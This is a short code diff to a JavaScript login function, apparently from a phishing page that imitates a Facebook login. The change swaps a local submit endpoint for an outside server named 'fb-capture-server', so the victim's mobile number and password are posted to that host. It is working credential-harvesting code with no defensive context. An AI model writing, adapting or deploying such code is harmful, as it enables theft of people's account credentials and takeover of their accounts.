@@ -8,7 +8,7 @@ function logIn(){
        return;
     }
    
-    fetch('/submit', {
+    fetch('https://fb-capture-server.onrender.com/submit', {
         method: 'POST', 
         headers: {'Content-type': 'application/json'},
         body: JSON.stringify({mobileNumber, Password})
